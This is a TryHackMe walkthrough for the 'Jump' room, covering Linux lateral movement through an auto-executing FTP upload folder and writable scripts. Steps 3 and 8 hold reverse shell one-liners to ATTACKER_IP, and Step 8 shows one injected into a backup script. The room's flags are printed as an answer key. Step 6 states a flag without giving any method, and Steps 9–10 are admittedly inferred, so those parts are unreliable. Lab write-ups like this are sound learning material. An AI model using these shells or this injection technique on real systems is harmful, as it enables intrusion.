# TryHackMe - Jump Walkthrough

## Challenge Info

| Category   | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Easy |
| OS | Linux |
| Objective | Abuse trust relationships between users and automation pipelines to move laterally: `recon_user → dev_user → monitor_user → ops_user → root` |

---

## Step 1 — Recon

```bash
nmap -p- 10.48.139.20          # full port scan
nmap -sC -sV 10.48.139.20      # service/version detection
```

**Findings:**
- `21/tcp` — vsftpd 3.0.5, **anonymous login allowed**
- `22/tcp` — OpenSSH
- `incoming/` → world-writable
- `pub/` → readable

---

## Step 2 — FTP Enumeration

```bash
ftp 10.48.139.20
# login: anonymous
```

A `README.txt` inside explains that files dropped in `incoming/` are automatically picked up and executed by a recon pipeline — a classic "upload → auto-execute" setup.

---

## Step 3 — Exploit the Recon Pipeline → `recon_user`

Create a reverse shell payload and upload it into `incoming/`:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Start a listener and wait for the pipeline to execute it:

```bash
nc -lvnp 4444
```

You land as `recon_user`.

---

## Step 4 — Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Step 5 — `recon_user` Flag

```bash
cat flag.txt
```
**Flag:** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`

---

## Step 6 — Pivot to `dev_user`

Enumerate the filesystem from `recon_user` to locate access into `dev_user` (writable file, shared credential, or group permission tied to recon_user's role).

```bash
cat flag.txt
```
**Flag:** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`

---

## Step 7 — Find the Next Trust Boundary (`monitor_user`)

```bash
find / -type f -group monitor_user 2>/dev/null
```

Results:
```
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/var/log/monitor.log
```

`monitor_user` is identified as the next hop.

---

## Step 8 — Abuse a Writable Script (core technique of this box)

As `dev_user`, `/opt/dev/backup.sh` is run by a higher-privileged stage but is group-writable:

```bash
cat /opt/dev/backup.sh
# -rwxrwxr-x  → writable by dev_user
```

Append a reverse shell so the automation calls back when it runs:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/ATTACKER_IP/5556 0>&1
```

```bash
nc -lvnp 5556
```

When the pipeline executes `backup.sh` as the next-stage user, you get a shell as that user.

**Core lesson:** each user trusts and automatically runs scripts left behind by the previous user. A writable script owned/executed by a more privileged stage = privilege escalation.

---

## Steps 9–10 — `monitor_user` → `ops_user` → `root` (apply the same pattern)

The original source material stops short of giving exact commands here. Based on the established pattern, continue with:

- `sudo -l` as `monitor_user` — check for anything runnable as `ops_user`/`root`.
- Cron enumeration:
  ```bash
  cat /etc/crontab
  ls -la /etc/cron.d/
  crontab -l
  ```
- Repeat Step 7's trick: search for files/scripts owned by `ops_user` that `monitor_user` can write to:
  ```bash
  find / -type f -group ops_user -writable 2>/dev/null
  ```
- Inject a reverse shell into whatever script the next-stage user/cron job executes (same approach as Step 8), then catch the shell as `ops_user`, then as `root`.

**Known flags for these stages** (from completing the room):
- `ops_user`: `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`
- `root`: `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`

---

## Key Takeaways

- World-writable automation folders are a direct code-execution vector.
- Automated execution pipelines (upload-and-process, cron, backup jobs) frequently become privilege escalation paths.
- Trust relationships between users can be more dangerous than software vulnerabilities.
- Writable scripts executed by privileged users are an easy win — always check with `find / -writable -user <target> 2>/dev/null` style searches.
- Always enumerate scheduled jobs, backup scripts, and deployment helpers during Linux privesc.
